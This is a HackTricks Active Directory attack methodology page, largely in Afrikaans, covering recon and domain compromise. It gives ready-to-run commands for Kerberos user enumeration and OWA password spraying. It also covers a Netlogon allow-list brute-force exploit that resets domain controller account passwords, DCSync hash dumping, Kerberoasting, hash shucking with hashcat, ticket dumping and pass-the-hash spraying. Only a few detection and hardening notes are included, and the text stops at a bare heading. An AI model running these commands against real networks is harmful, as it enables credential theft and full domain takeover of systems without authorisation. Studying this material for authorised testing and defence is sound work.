# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n fundamentele tegnologie, wat **network administrators** in staat stel om **domains**, **users**, en **objects** binne 'n network doeltreffend te skep en te bestuur. Dit is ontwerp om te skaal, wat die organisering van 'n uitgebreide aantal users in hanteerbare **groups** en **subgroups** vergemaklik, terwyl **access rights** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domains**, **trees**, en **forests**. 'n **domain** sluit 'n versameling objects in, soos **users** of **devices**, wat 'n gemeenskaplike database deel. **Trees** is groups van hierdie domains wat deur 'n gedeelde struktuur gekoppel is, en 'n **forest** verteenwoordig die versameling van veelvuldige trees, onderling verbind deur **trust relationships**, wat die boonste laag van die organisatoriese struktuur vorm. Spesifieke **access**- en **communication rights** kan by elk van hierdie vlakke toegeken word.

Belangrike konsepte binne **Active Directory** sluit in:

1. **Directory** – Bevat alle inligting wat verband hou met Active Directory objects.
2. **Object** – Dui entiteite binne die directory aan, insluitend **users**, **groups**, of **shared folders**.
3. **Domain** – Dien as 'n houer vir directory objects, met die vermoë vir veelvuldige domains om binne 'n **forest** saam te bestaan, elk met sy eie object-versameling.
4. **Tree** – 'n Groepering van domains wat 'n gemeenskaplike root domain deel.
5. **Forest** – Die toppunt van organisatoriese struktuur in Active Directory, saamgestel uit verskeie trees met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat 'n reeks services wat krities is vir die gesentraliseerde bestuur en kommunikasie binne 'n network. Hierdie services bestaan uit:

1. **Domain Services** – Sentreer data-opberging en bestuur interaksies tussen **users** en **domains**, insluitend **authentication**- en **search**-funksionaliteit.
2. **Certificate Services** – Hou toesig oor die skep, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-enabled applications deur die **LDAP protocol**.
4. **Directory Federation Services** – Bied **single-sign-on**-vermoëns om users oor multiple web applications in 'n enkele session te authenticate.
5. **Rights Management** – Help om kopieregmateriaal te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

Vir 'n meer gedetailleerde verduideliking, kyk: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om **attack an AD** moet jy die **Kerberos authentication process** baie goed **understand**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan baie neem na [https://wadcoms.github.io/](https://wadcoms.github.io) om 'n vinnige oorsig te kry van watter commands jy kan run om 'n AD te enumerate/exploit.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

As jy net toegang het tot 'n AD environment maar jy het nie enige credentials/sessions nie, kon jy:

- **Pentest the network:**
- Scan the network, vind machines en open ports en probeer om **vulnerabilities** te **exploit** of **credentials** daaruit te onttrek (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md).
- Die enumerating van DNS kan inligting gee oor sleutel servers in die domain soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die Algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) om meer inligting te vind oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 'n Meer gedetailleerde gids oor hoe om 'n SMB server te enumerate kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 'n Meer gedetailleerde gids oor hoe om LDAP te enumerate kan hier gevind word (gee **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
- If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie servers in die netwerk gevind het, kan jy ook **user enumeration daarteen** uitvoer. Byvoorbeeld, jy kan die tool [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van gebruikersname vind in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, jy should die **name of the people working on the company** hê vanaf die recon-stap wat jy voor dit moes uitgevoer het. Met die naam en van kon jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensiële geldige usernames te genereer.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Selfs nadat **Zerologon** op die DC gepatch is, kan uitdruklik allow-listed accounts steeds blootgestel wees aan **legacy/vulnerable Netlogon secure-channel behavior**. Die riskante konfigurasie is die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** of die ooreenstemmende registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Daardie value is 'n **SDDL security descriptor** (sien [Security Descriptors](security-descriptors.md)). Enige account of group waaraan die relevante ACE in die DACL toegestaan is, kan geteiken word. Byvoorbeeld, `O:BAG:BAD:(A;;RC;;;WD)` allow-list effektief **Everyone**.

Praktiese operator workflow:

1. **Identify allow-listed principals** deur beide **SYSVOL/GPO** en die **live DC registry** te check.
2. **Resolve SIDs** wat in die SDDL gevind word na werklike AD users/computers en prioritiseer **DC machine accounts**, **trust accounts**, en ander geprivilegieerde machines.
3. Probeer herhaaldelik **MS-NRPC / Netlogon authentication** as die allow-listed account.
4. Ná 'n suksesvolle guess, abuse **Netlogon password-setting** om die target account password te reset (die public PoC stel dit op 'n leë string).

Quick triage / lab examples from the public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- Die **scanner** is nuttig omdat die effektiewe allow-list mag bestaan in **SYSVOL**, in die **registry**, of in albei.
- Die exploit-pad self is belangrik omdat dit **nie Domain Admin-voorregte vereis nie** sodra ’n kwesbare rekening geïdentifiseer is.
- Kompromittering van ’n **Domain Controller machine account** soos `DC$` is veral gevaarlik omdat die herstel van daardie wagwoord direk breër **AD takeover**-paaie kan aktiveer.
- **Brute-force haalbaarheid** hang af van die mode: die publieke artifact beskryf ’n meet-in-the-middle-benadering, ’n **24-bit** brute force wanneer nog ’n computer account beskikbaar is, en stadiger **32-bit** variante.

Detection / hardening notes:

- Oudit die allow-list policy en verwyder enigiets behalwe tydelike, uitdruklik vereiste compatibility-uitsonderings.
- Monitor DC **System** events **5827/5828/5829/5830/5831** om kwesbare Netlogon-verbindings op te vang wat geweier, ontdek, of uitdruklik deur policy toegelaat word.
- Behandel rekeninge in `VulnerableChannelAllowList` as **high-risk** totdat die legacy dependency verwyder is.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay na die DC geblokkeer** is deur signing, toets steeds **LDAP** posture: `netexec ldap <dc>` lig `(signing:None)` / swak channel binding uit. ’n DC met SMB signing required maar LDAP signing disabled bly ’n geldige **relay-to-LDAP** teiken vir abuses soos **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs embed soms **gemaskerde admin passwords in HTML**. Om source/devtools te bekyk kan cleartext openbaar maak (bv., `<input value="<password>">`), wat Basic-auth toegang moontlik maak om scan/print repositories te deursoek.
- Retrieved print jobs kan **plaintext onboarding docs** met per-user passwords bevat. Hou pairings gesinkroniseer wanneer jy toets:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT hash wat jy reeds besit as ’n kandidaatwagwoord vir ander, stadiger formate waarvan die sleutelmateriaal direk uit die NT hash afgelei word. In plaas daarvan om lang passphrases in Kerberos RC4 tickets, NetNTLM challenges, of cached credentials te brute-force, voer jy die NT hashes in Hashcat se NT-candidate modes in en laat dit password reuse valideer sonder om ooit die plaintext te leer. Dit is veral kragtig ná ’n domain compromise waar jy duisende huidige en historiese NT hashes kan harvest.

Gebruik shucking wanneer:

- Jy het ’n NT corpus van DCSync, SAM/SECURITY dumps, of credential vaults en moet reuse in ander domains/forests toets.
- Jy capture RC4-based Kerberos materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, of DCC/DCC2 blobs.
- Jy wil vinnig reuse vir lang, uncrackable passphrases bewys en onmiddellik pivot via Pass-the-Hash.

Die tegniek **werk nie** teen encryption types wie se keys nie die NT hash is nie (bv. Kerberos etype 17/18 AES). As ’n domain AES-only afdwing, moet jy terugval na die gewone password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met history om die grootste moontlike stel NT hashes (en hul vorige values) te kry:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries vergroot die kandidaatpoel aansienlik omdat Microsoft tot 24 vorige hashes per account kan stoor. Vir meer maniere om NTDS secrets te harvest, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) extraheer local SAM/SECURITY data en cached domain logons (DCC/DCC2). Deduplicate en voeg daardie hashes by dieselfde `nt_candidates.txt` lys.
- **Track metadata** – Hou die username/domain by wat elke hash geproduseer het (selfs al bevat die wordlist net hex). Matched hashes sê jou onmiddellik watter principal ’n password hergebruik sodra Hashcat die wenkandidaat uitdruk.
- Verkies candidates van dieselfde forest of ’n trusted forest; dit maksimeer die kans op overlap wanneer jy shuck.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **moet rou 32-hex NT hashes bly**. Skakel rule engines af (geen `-r`, geen hybrid modes) omdat mangling die kandidaat-sleutelmateriaal korrupteer.
- Hierdie modes is nie inherent vinniger nie, maar die NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om ’n gekureerde NT-lys te toets is baie goedkoper as om die hele password space in die stadige format te verken.
- Run altyd die **nuutste Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) omdat modes 31500/31600/35300/35400 onlangs verskeep is.
- Daar is tans geen NT mode vir AS-REQ Pre-Auth nie, en AES etypes (19600/19700) vereis die plaintext password omdat hul keys via PBKDF2 afgelei word uit UTF-16LE passwords, nie rou NT hashes nie.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture ’n RC4 TGS vir ’n target SPN met ’n low-privileged user (sien die Kerberoast page vir details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck die ticket met jou NT lys:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derive die RC4 key uit elke NT candidate en valideer die `$krb5tgs$23$...` blob. ’n Match bevestig dat die service account een van jou bestaande NT hashes gebruik.

3. Pivot onmiddellik via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Jy kan opsioneel later die plaintext recover met `hashcat -m 1000 <matched_hash> wordlists/` indien nodig.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons van ’n compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopieer die DCC2-reël vir die interessante domain user in `dcc2_highpriv.txt` en shuck dit:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. ’n Suksesvolle match gee die NT hash wat reeds in jou lys bekend is, wat bewys dat die cached user ’n password hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in fast NTLM mode om die string te recover.

Dieselfde workflow geld vir NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra ’n match geïdentifiseer is, kan jy relay, SMB/WMI/WinRM PtH, of die NT hash weer offline met masks/rules crack.



## Enumerating Active Directory WITH credentials/session

Vir hierdie fase moet jy **die credentials of ’n session van ’n geldige domain account** gekompromitteer hê. As jy geldige credentials of ’n shell as ’n domain user het, **moet jy onthou dat die opsies wat vroeër gegee is steeds opsies is om ander users te kompromitteer**.

Voordat jy met authenticated enumeration begin, moet jy weet wat die **Kerberos double hop problem** is.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Om ’n account te kompromitteer is ’n **groot stap om die hele domain te begin kompromitteer**, want jy gaan in staat wees om die **Active Directory Enumeration** te begin:

Met betrekking tot [**ASREPRoast**](asreproast.md) kan jy nou elke moontlike vulnerable user vind, en met betrekking tot [**Password Spraying**](password-spraying.md) kan jy ’n **lys van al die usernames** kry en die password van die compromised account, leë passwords en nuwe belowende passwords probeer.

- Jy kan die [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) gebruik
- Jy kan ook [**powershell for recon**](../basic-powershell-for-pentesters/index.html) gebruik, wat stealthier sal wees
- Jy kan ook [**use powerview**](../basic-powershell-for-pentesters/powerview.md) gebruik om meer gedetailleerde inligting te onttrek
- Nog ’n fantastiese tool vir recon in ’n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy nie** (afhangend van die collection methods wat jy gebruik), maar **as jy nie daaroor omgee nie**, moet jy dit beslis probeer. Vind waar users RDP kan gebruik, vind path na ander groups, ens.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) aangesien dit interessante inligting kan bevat.
- ’n **tool with GUI** wat jy kan gebruik om die directory te enumerate is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook in die LDAP database soek met **ldapsearch** om vir credentials in velde _userPassword_ & _unixUserPassword_, of selfs _Description_, te soek. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander methods.
- As jy **Linux** gebruik, kan jy die domain ook enumerate met [**pywerview**](https://github.com/the-useless-one/pywerview).
- Jy kan ook outomatiese tools soos probeer:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Dit is baie maklik om al die domain usernames van Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumeration-afdeling klein, is dit die belangrikste deel van alles. Volg die links (hoofsaaklik die een van cmd, powershell, powerview en BloodHound), leer hoe om ’n domain te enumerate en oefen totdat jy gemaklik voel. Tydens ’n assessment sal dit die sleuteloomblik wees om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die verkryging van **TGS tickets** wat deur services gebruik word wat aan user accounts gekoppel is en die krak van hul encryption - wat op user passwords gebaseer is - **offline**.

Meer hieroor in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sodra jy ’n paar credentials bekom het, kan jy nagaan of jy toegang tot enige **machine** het. Vir daardie doel kan jy **CrackMapExec** gebruik om te probeer koppel op verskeie servers met verskillende protocols, ooreenkomstig met jou ports scans.

### Local Privilege Escalation

As jy compromised credentials of ’n session as ’n gewone domain user het en jy **access** met hierdie user tot **enige machine in die domain** het, moet jy probeer om jou pad te vind om **privileges lokaal te escalate en vir credentials te looting**. Dit is omdat slegs met local administrator privileges jy **hashes van ander users** in memory (LSASS) en lokaal (SAM) sal kan **dump**.

Daar is ’n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en ’n [**checklist**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige user sal vind wat jou toestemming gee om onverwachte resources te access, maar jy kan check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

As jy die active directory suksesvol gelys het, sal jy **meer e-posse en ’n beter begrip van die netwerk** hê. Jy kan dalk NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** afdwing.**

### Looks for Creds in Computer Shares | SMB Shares

Nou dat jy ’n paar basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit handmatig doen, maar dis ’n baie vervelige herhalende taak (en nog meer as jy honderde docs vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te leer oor tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy toegang tot ander PCs of shares kan **kry**, kan jy **lêers plaas** (soos ’n SCF file) wat, as dit op een of ander manier oopgemaak word, ’n NTLM authentication teen jou sal **trigger** sodat jy die **NTLM challenge** kan **steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geverifieerde user toegelaat om die **domain controller te compromise**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Vir die volgende techniques is ’n gewone domain user nie genoeg nie; jy het spesiale privileges/credentials nodig om hierdie attacks uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om ’n **local admin** account te **compromise** met [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in memory en lokaal te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van ’n user het**, kan jy dit gebruik om hom te **impersonate**.\
Jy moet ’n **tool** gebruik wat die **NTLM authentication met** daardie **hash** sal **perform**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** in die **LSASS** **inject**, sodat wanneer enige **NTLM authentication performed** word, daardie **hash** gebruik sal word. Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie attack poog om die user NTLM hash te **use** om Kerberos tickets aan te vra, as ’n alternatief vir die gewone Pass The Hash oor die NTLM protocol. Daarom kan dit veral **nuttig wees in netwerke waar die NTLM protocol gedeaktiveer is** en net **Kerberos toegelaat** word as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** attack method, **steel aanvallers ’n user se authentication ticket** in plaas van sy password of hash values. Hierdie gesteelde ticket word dan gebruik om die user te **impersonate**, en kry ongemagtigde toegang tot resources en services binne ’n network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van ’n **local administrator** het, moet jy probeer om **lokaal in te log** op ander **PCs** daarmee.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let daarop dat dit nogal **noisy** is en **LAPS** sou dit **mitigeer**.

### MSSQL Abuse & Trusted Links

As 'n gebruiker voorregte het om **toegang te kry tot MSSQL instances**, kan hy dit moontlik gebruik om **commands uit te voer** op die MSSQL host (indien dit as SA loop), die NetNTLM **hash** te **steel** of selfs 'n **relay** **attack** uit te voer.\
Ook, as 'n MSSQL instance deur 'n ander MSSQL instance vertrou word (database link). As die gebruiker voorregte oor die vertroude database het, gaan hy in staat wees om die **vertrouensverhouding te gebruik om queries ook in die ander instance uit te voer**. Hierdie trusts kan geketting word en op 'n stadium kan die gebruiker dalk 'n verkeerd gekonfigureerde database vind waar hy commands kan uitvoer.\
**Die links tussen databases werk selfs oor forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites expose dikwels kragtige paaie na credentials en code execution. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer object vind met die attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) en jy het domain privileges op die computer, sal jy in staat wees om TGTs uit geheue te dump van elke gebruiker wat op die computer aanmeld.\
So, as 'n **Domain Admin op die computer aanmeld**, sal jy sy TGT kan dump en hom impersonate deur [Pass the Ticket](pass-the-ticket.md) te gebruik.\
Danksy constrained delegation kan jy selfs **outomaties 'n Print Server kompromitteer** (hopelik sal dit 'n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As 'n gebruiker of computer toegelaat word vir "Constrained Delegation", sal dit in staat wees om **enige gebruiker te impersonate om toegang tot sekere services op 'n computer te kry**.\
Dan, as jy die **hash van hierdie gebruiker/computer kompromitteer**, sal jy in staat wees om **enige gebruiker te impersonate** (selfs domain admins) om toegang tot sekere services te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Om **WRITE** privilege op 'n Active Directory object van 'n remote computer te hê, maak die verkryging van code execution met **elevated privileges** moontlik:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die gekompromitteerde gebruiker kon sekere **interessante privileges oor sommige domain objects** hê wat jou kan toelaat om lateraal te **move**/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

